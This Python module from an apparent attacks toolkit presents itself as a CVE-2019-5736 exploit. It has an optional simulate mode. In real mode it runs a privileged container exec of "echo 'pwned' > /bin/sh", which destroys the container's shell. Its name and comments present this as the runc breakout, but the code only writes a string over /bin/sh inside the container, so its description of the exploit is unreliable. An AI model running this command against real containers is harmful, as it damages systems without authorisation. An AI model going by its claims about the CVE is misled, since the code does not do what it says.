# Path: attacks/cve_2019_5736.py

def run(container, simulate=False):
    print("[*] Running CVE-2019-5736 exploit...")

    if simulate:
        # Simulated execution: log what would be done instead of modifying the container
        print(f"[SIMULATE] Would attempt to overwrite /bin/sh inside container '{container.name}'")
        return "Simulated run: No changes made."

    try:
        # ⚠️ WARNING: This exploit attempts to overwrite /bin/sh inside the container.
        # If successful, any shell spawned in the container may execute attacker-controlled code.
        # This is dangerous and can destabilize the container environment or persist across restarts
        # if the container uses a volume-mapped /bin.

        print(f"[!] WARNING: Attempting real overwrite of /bin/sh in container '{container.name}'")
        exec_result = container.exec_run("echo 'pwned' > /bin/sh", privileged=True)
        print(f"[+] Exploit attempted. Output: {exec_result.output.decode()}")
        return "Executed: Attempted to overwrite /bin/sh"

    except Exception as e:
        print(f"[!] Exploit failed with error: {e}")
        return f"Failed: {str(e)}"
